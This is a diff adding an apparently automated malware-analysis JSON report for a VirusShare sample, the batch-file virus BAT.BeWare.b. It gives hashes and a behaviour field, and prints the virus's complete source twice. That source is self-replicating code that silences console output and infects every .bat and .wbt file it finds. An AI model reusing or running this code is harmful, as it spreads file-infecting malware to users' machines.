@@ -1,0 +1,64 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "::BAT.BeWare.b\n@REM BeWare\n@goto RunBeWare\n:Comon %%BeWare%%\n@ctty nul%%BeWare%%\nif ^%%1==^BeWareBAT goto BeWareBAT\nif ^%%1==^BeWareWBT goto BeWareWBT\nfor %%%%b in (*.bat) do call %%0 BeWareBAT %%%%b\nfor %%%%w in (*.wbt) do call %%0 BeWareWBT %%%%w\ndel $BeWare$\ngoto End%%BeWare%%\n:BeWareBAT\nfind \"\"BeWare\"\"<%%2\nif not errorlevel 1 goto End%%BeWare%%\ncopy %%2 $BeWare$\necho.>>$BeWare$\necho @goto Comon>>$BeWare$\necho :End>>$BeWare$\nfind \"\"BeWare\"\"<%%0>%%2\ntype $BeWare$>>%%2\ngoto End%%BeWare%%\n:BeWareWBT\nfind \"\"BeWare\"\"<%%2\nif not errorlevel 1 goto End%%BeWare%%\ncopy %%2 $BeWare$\nfind \"\"BeWare%%BeWare%%!\"\"<%%0>%%2\ntype $BeWare$>>%%2\ngoto End%%BeWare%%\n:RunBeWare\n@goto Comon\n:End"
+    },
+    "filename": "VirusShare_06524e486f3ed9cf396205797b6e0953",
+    "filesize": 714,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "06524e486f3ed9cf396205797b6e0953",
+        "sha1": "286cd9be7542bec2e0260617b40dd33a36686dc3",
+        "sha256": "58dc6be8e220dabe51075cccc48b38734622b0cddacfea61e2f5c656f49a9974"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "::BAT.BeWare.b",
+            "@REM BeWare",
+            "@goto RunBeWare",
+            ":Comon %%BeWare%%",
+            "@ctty nul%%BeWare%%",
+            "if ^%%1==^BeWareBAT goto BeWareBAT",
+            "if ^%%1==^BeWareWBT goto BeWareWBT",
+            "for %%%%b in (*.bat) do call %%0 BeWareBAT %%%%b",
+            "for %%%%w in (*.wbt) do call %%0 BeWareWBT %%%%w",
+            "del $BeWare$",
+            "goto End%%BeWare%%",
+            ":BeWareBAT",
+            "find \"\"BeWare\"\"<%%2",
+            "if not errorlevel 1 goto End%%BeWare%%",
+            "copy %%2 $BeWare$",
+            "echo.>>$BeWare$",
+            "echo @goto Comon>>$BeWare$",
+            "echo :End>>$BeWare$",
+            "find \"\"BeWare\"\"<%%0>%%2",
+            "type $BeWare$>>%%2",
+            "goto End%%BeWare%%",
+            ":BeWareWBT",
+            "find \"\"BeWare\"\"<%%2",
+            "if not errorlevel 1 goto End%%BeWare%%",
+            "copy %%2 $BeWare$",
+            "find \"\"BeWare%%BeWare%%!\"\"<%%0>%%2",
+            "type $BeWare$>>%%2",
+            "goto End%%BeWare%%",
+            ":RunBeWare",
+            "@goto Comon",
+            ":End"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.254323",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
